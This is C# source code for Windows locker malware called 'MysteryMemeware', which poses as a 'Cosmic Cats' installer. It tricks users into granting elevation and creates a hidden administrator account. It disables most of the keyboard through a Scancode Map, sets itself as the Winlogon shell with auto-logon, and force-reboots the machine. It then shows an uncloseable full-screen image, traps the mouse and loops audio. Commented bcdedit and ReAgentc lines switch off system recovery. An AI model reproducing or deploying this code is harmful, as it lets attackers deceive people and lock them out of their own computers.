namespace MysteryMemeware
{
    public static class Program
    {
        //Approved 07/28/2022 7:54pm
        public static void Main()
        {
            //Try to run the main program logic and if that logic throws an exception then show the exception message to the user through a win32 popup.

            try
            {
                //If the program is currently installed then start up the installation otherwise install it.

                if (IsInstalled())
                {
                    //If the program is running as administrator then go ahead and begin playing the song, however, if it is not then we need to elevate ourself using the stored admin credentials.

                    if (IsAdministrator())
                    {
                        Run();
                    }
                    else
                    {
                        ElevateSelf();
                    }
                }
                else
                {
                    //If the program is running as administrator then go ahead and install, however, if it is not then we need to ask the user for administrator with a UAC. Note that part of the installation process will grant our program perminant access to the administrator user which prevents the need for furthar UACs.

                    if (IsAdministrator())
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
            }
            catch (System.Exception exception)
            {
                //If an exception occurs display the exception message to the user in a win32 popup.

                System.Windows.Forms.MessageBox.Show("Execution failed due to exception: " + exception.Message, "Exception Thrown!", System.Windows.Forms.MessageBoxButtons.OK);
            }

            //Kill the current process to terminate any multithreaded opperations when we reach the end of the main logic.

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        //Approved 07/28/2022 7:54pm
        public static bool IsInstalled()
        {
            try
            {
                //Open up the settings registry and get the value of IsInstalled.

                Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

                Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

                if (mysteryMemeware is null)
                {
                    return false;
                }

                object isInstalled = mysteryMemeware.GetValue("IsInstalled");

                mysteryMemeware.Close();
                mysteryMemeware.Dispose();

                LocalMachine.Close();
                LocalMachine.Dispose();

                if (isInstalled is null)
                {
                    return false;
                }

                System.Type isInstalledType = isInstalled.GetType();

                //If IsInstalled is a string then check and see if it is 1 true t yes or y and if it is an integer then check if it is 1.

                if (isInstalledType == typeof(string))
                {
                    string isInstalledString = ((string)isInstalled).ToLower();

                    if (isInstalledString is "1" || isInstalledString is "true" || isInstalledString is "t" || isInstalledString is "yes" || isInstalledString is "y")
                    {
                        return true;
                    }

                    return false;
                }
                else if (isInstalledType == typeof(int))
                {
                    int isInstalledInt = (int)isInstalled;

                    if (isInstalledInt is 1)
                    {
                        return true;
                    }

                    return false;
                }
                else if (isInstalledType == typeof(long))
                {
                    long isInstalledLong = (long)isInstalled;

                    if (isInstalledLong is 1)
                    {
                        return true;
                    }

                    return false;
                }

                return false;
            }
            catch
            {
                //If something goes wrong then it is safest to assume that the program is not installed and try to install it again.

                return false;
            }
        }
        //Approved 07/28/2022 7:54pm
        public static bool IsAdministrator()
        {
            //Checks weather the current process is running as administrator or not using windows security principals.

            try
            {
                System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();

                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);

                bool isAdministrator = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

                identity.Dispose();

                return isAdministrator;
            }
            catch
            {
                //If something went wrong then it is safest to assume we are not yet running as administrator.

                return false;
            }
        }
        //Approved 07/28/2022 7:53pm
        public static void ElevateSelf()
        {
            //Open up the settings registry and get the value of IsInstalled.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

            if (mysteryMemeware is null)
            {
                throw new System.Exception("Settings registry does not exist or is inaccessable.");
            }

            object adminPassword = mysteryMemeware.GetValue("AdminPassword");

            mysteryMemeware.Close();
            mysteryMemeware.Dispose();

            LocalMachine.Close();
            LocalMachine.Dispose();

            if (adminPassword is null)
            {
                throw new System.Exception("AdminPassword was not stored or is inaccessable.");
            }

            System.Type adminPasswordType = adminPassword.GetType();

            //If adminPassword is not a string then throw an exception.

            if (adminPasswordType != typeof(string))
            {
                throw new System.Exception("AdminPassword was not in the propper format.");
            }

            string adminPasswordString = (string)adminPassword;

            //Restart this application as administrator and kill the current process.

            System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

            adminRestartStartInfo.Arguments = "";
            adminRestartStartInfo.CreateNoWindow = false;
            adminRestartStartInfo.Domain = null;
            adminRestartStartInfo.ErrorDialog = false;
            adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
            adminRestartStartInfo.FileName = typeof(Program).Assembly.Location;
            adminRestartStartInfo.LoadUserProfile = false;
            adminRestartStartInfo.Password = null;
            adminRestartStartInfo.PasswordInClearText = adminPasswordString;
            adminRestartStartInfo.RedirectStandardError = false;
            adminRestartStartInfo.RedirectStandardInput = false;
            adminRestartStartInfo.RedirectStandardOutput = false;
            adminRestartStartInfo.StandardErrorEncoding = null;
            adminRestartStartInfo.StandardOutputEncoding = null;
            adminRestartStartInfo.UserName = "Administrator";
            adminRestartStartInfo.UseShellExecute = false;
            adminRestartStartInfo.Verb = "runas";
            adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(typeof(Program).Assembly.Location)).FullName;

            System.Diagnostics.Process.Start(adminRestartStartInfo);

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        //Approved 07/28/2022 7:54pm
        public static void BegForAdmin()
        {
            //Ask the user if they would like to install cosmic cats.

            if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
            {
                //Return without asking for administrator if they select cancel. Respecting the users request helps to build enough trust for them to grant administrator next time.

                return;
            }

            //Notify the user that elevated permissions are required. Note that we do not use the words "administrator" or "admin" because those words often trigger anxiety about viruses.

            if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
            {
                //Again return without asking for administrator if they select cancel. Respecting the users request helps to build enough trust for them to grant administrator next time.

                return;
            }

            try
            {
                //Restart this application as administrator and kill the current process.

                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

                adminRestartStartInfo.Arguments = "";
                adminRestartStartInfo.CreateNoWindow = true;
                adminRestartStartInfo.Domain = null;
                adminRestartStartInfo.ErrorDialog = false;
                adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
                adminRestartStartInfo.FileName = typeof(Program).Assembly.Location;
                adminRestartStartInfo.LoadUserProfile = false;
                adminRestartStartInfo.Password = null;
                adminRestartStartInfo.PasswordInClearText = null;
                adminRestartStartInfo.RedirectStandardError = false;
                adminRestartStartInfo.RedirectStandardInput = false;
                adminRestartStartInfo.RedirectStandardOutput = false;
                adminRestartStartInfo.StandardErrorEncoding = null;
                adminRestartStartInfo.StandardOutputEncoding = null;
                adminRestartStartInfo.UserName = null;
                adminRestartStartInfo.UseShellExecute = false;
                adminRestartStartInfo.Verb = "runas";
                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(typeof(Program).Assembly.Location)).FullName;

                System.Diagnostics.Process.Start(adminRestartStartInfo);

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                //Catch win32 exceptions which specify the cancelled by user error code. These errors will be throw when the user denies administrator access.

                if (ex.NativeErrorCode == 1223)
                {
                    //If we got here then that means the user denied access to administrator when prompted. We should use this as an oppertunity to build trust with the user by politely explaining the situation to them.

                    System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed. If you would like to install Cosmic Cats later simply run the installer again.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
                }
                else
                {
                    //If the exception is a win32 exception but does not have the error code for cancelled by user then we should rethrow the error and notify the user because something more severe occured instead of simply being denied access to administrator access.

                    throw ex;
                }
            }
        }



        //Approved 07/26/2022 3:51pm
        public static void Install()
        {
            /*
             
            //disable reg Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0
            //Disable reg Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0

              System.Windows.Forms.MessageBox.Show(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            System.Windows.Forms.MessageBox.Show(System.Environment.UserName);
            if (IsAdmin())
            {
                System.Windows.Forms.MessageBox.Show(IsAdmin().ToString());
            }
            else
            {
                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();

                adminRestartStartInfo.UseShellExecute = false;
                adminRestartStartInfo.Arguments = "";
                adminRestartStartInfo.CreateNoWindow = false;
                adminRestartStartInfo.FileName = typeof(Program).Assembly.Location;
                adminRestartStartInfo.UserName = "administrator";
                adminRestartStartInfo.PasswordInClearText = "password";
                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;

                System.Diagnostics.Process adminRestartProcess = System.Diagnostics.Process.Start(adminRestartStartInfo);

                while (!adminRestartProcess.Responding)
                {

                }

                new System.Runtime.InteropServices.HandleRef(null, adminRestartProcess.MainWindowHandle);

                System.Windows.Forms.SendKeys.SendWait("password~");

                while (!adminRestartProcess.HasExited)
                {

                }
            }
             */

            //Set the locations of some important paths including making sure that the install location is on the windows installation drive.
            //This will ensure that it is runable on next start up and does not become unavailible if a USB device is unpluged or a network share drive becomes unavailible.
            //Finally cope the currently running executable to the install location.

            string system32Folder = (new System.IO.DirectoryInfo(System.Environment.GetFolderPath(System.Environment.SpecialFolder.System))).FullName;

            System.Windows.Forms.MessageBox.Show(system32Folder);

            string installLocation = (new System.IO.DirectoryInfo(system32Folder)).Root.FullName + "MysteryMemeware.exe";

            System.Windows.Forms.MessageBox.Show(installLocation);

            System.IO.File.Copy(typeof(Program).Assembly.Location, installLocation);

            //Randomly generate a new 14 character password from the valid password character set.

            System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

            char[] passwordChars = new char[14] { 'U', 'n', 's', 'e', 't', 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1' };

            for (int i = 0; i < 14; i++)
            {
                passwordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
            }

            string password = new string(passwordChars);

            System.Windows.Forms.MessageBox.Show(password);

            //Create a new user named MysteryUser with the password specified earlier using net.exe.

            System.Diagnostics.ProcessStartInfo createUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            createUserProcessStartInfo.Arguments = "user /add \"MysteryUser\" \"" + password + "\"";
            createUserProcessStartInfo.CreateNoWindow = true;
            createUserProcessStartInfo.ErrorDialog = false;
            createUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
            createUserProcessStartInfo.UseShellExecute = false;
            createUserProcessStartInfo.Verb = "runas";
            createUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process createUserProcess = System.Diagnostics.Process.Start(createUserProcessStartInfo);

            while (!createUserProcess.HasExited)
            {

            }

            if (createUserProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to create MysteryUser because net.exe returned exit code \"" + createUserProcess.ExitCode + "\".");
            }

            //Add the MyseryUser to the administrators group using net.exe.

            System.Diagnostics.ProcessStartInfo elevateUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            elevateUserProcessStartInfo.Arguments = "localgroup Administrators /add \"MysteryUser\"";
            elevateUserProcessStartInfo.CreateNoWindow = true;
            elevateUserProcessStartInfo.ErrorDialog = false;
            elevateUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
            elevateUserProcessStartInfo.UseShellExecute = false;
            elevateUserProcessStartInfo.Verb = "runas";
            elevateUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process elevateUserProcess = System.Diagnostics.Process.Start(elevateUserProcessStartInfo);

            while (!elevateUserProcess.HasExited)
            {

            }

            if (elevateUserProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to add MysteryUser to the administrators group because net.exe returned exit code \"" + elevateUserProcess.ExitCode + "\".");
            }

            //Open the local machine registry in 64 bit mode for use later.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            //Open the software registry for use later.

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            //Set a registry to disable the privacey experience popup when signing into a new user account.

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            //Open up the winlogon registry for user later.

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
            WinLogon.SetValue("Shell", installLocation);

            //Set some registries to automatically sign into the the MysteryUser.

            WinLogon.SetValue("DefaultUserName", "MysteryUser");
            WinLogon.SetValue("DefaultPassword", password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            //Close the winlogon registry since we are now completely done using it.

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            //We are now done with the bulk of the installation. The following is just a few extra things to slow down potential repair methods.
            //Because the following are not required for this program to work correctly they are all in try / catch statements to prevent a full crash if they fail.



            /*
             C:\Windows\System32\bcdedit.exe /set bootstatuspolicy ignoreallfailures
             C:\Windows\System32\bcdedit.exe /set recoveryenabled No
             C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
             C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No
             C:\Windows\System32\ReAgentc.exe /disable
            */

            //Now that we are done installing this software. Open up the settings registry to store some information about the installation.

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("MysteryUserPassword", password);
            MysteryMemeware.SetValue("IsInstalled", "true");

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            //Close the software registry since we are now completely done using it.

            Software.Flush();
            Software.Close();
            Software.Dispose();

            //Close the local machine registry since we are now completely done using it.

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            //Restart the users computer to finalize the installation process using shutdown.exe.

            System.Diagnostics.ProcessStartInfo shutdownProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            shutdownProcessStartInfo.Arguments = "/r /f /t 0";
            shutdownProcessStartInfo.CreateNoWindow = true;
            shutdownProcessStartInfo.ErrorDialog = false;
            shutdownProcessStartInfo.FileName = system32Folder + "\\shutdown.exe";
            shutdownProcessStartInfo.UseShellExecute = false;
            shutdownProcessStartInfo.Verb = "runas";
            shutdownProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process shutdownProcess = System.Diagnostics.Process.Start(shutdownProcessStartInfo);

            while (!shutdownProcess.HasExited)
            {

            }

            if (shutdownProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to restart computer because shutdown.exe returned exit code \"" + shutdownProcess.ExitCode + "\".");
            }
        }



        //Pending Approval
        public static void Run()
        {
            //VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();

            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {

                int localScreenIndex = screenIndex;
                System.Threading.Thread thread = new System.Threading.Thread(() =>
                {
                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
                    form.ShowDialog();
                });
                thread.Start();
            }

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        //Pending Approval
        private sealed class MainForm : System.Windows.Forms.Form
        {
            public MainForm(int screenID, System.Drawing.Image coverImage)
            {
                this.BackColor = System.Drawing.Color.White;

                this.ShowInTaskbar = false;

                this.TopMost = true;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;

                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;

                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];

                this.Location = screen.Bounds.Location;
                this.Width = screen.Bounds.Width;
                this.Height = screen.Bounds.Height;

                CustomPictureBox pictureBox = new CustomPictureBox();

                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;

                double viewPortWidth = screen.Bounds.Width;
                double viewPortHeight = screen.Bounds.Height;

                double renderWidth = viewPortHeight * targetAspectRatio;
                double renderHeight = viewPortWidth / targetAspectRatio;

                if (renderWidth > viewPortWidth)
                {
                    renderWidth = viewPortWidth;
                }
                if (renderHeight > viewPortHeight)
                {
                    renderHeight = viewPortHeight;
                }

                double renderX = (viewPortWidth - renderWidth) / 2;
                double renderY = (viewPortHeight - renderHeight) / 2;

                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
                pictureBox.Width = (int)renderWidth;
                pictureBox.Height = (int)renderHeight;

                pictureBox.Image = coverImage;
                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;

                this.Controls.Add(pictureBox);

                this.FormClosing += OnFormClosing;

                this.Load += OnFormLoad;

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }

            private void OnFormLoad(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
                timer.Tick += OnTimerTick;
                timer.Interval = 1000;
                timer.Start();

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnTimerTick(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
            {
                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
            }
        }
        //Pending Approval
        public static class VolumeModule
        {
            public static void SetVolume()
            {
                System.Threading.Thread childThread = new System.Threading.Thread(() =>
                {
                    System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
                    while (true)
                    {
                        for (int i = 0; i < 50; i++)
                        {
                            SendMessage(processHandle, 793, processHandle, 655360);
                        }
                        System.Threading.Thread.Sleep(1000);
                    }
                });
                childThread.Start();
            }
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern System.IntPtr SendMessage(System.IntPtr WMAppCommandProcessHandle, uint WMAppCommand, System.IntPtr AppCommandProcessHandle, uint appCommand);
        }
    }
}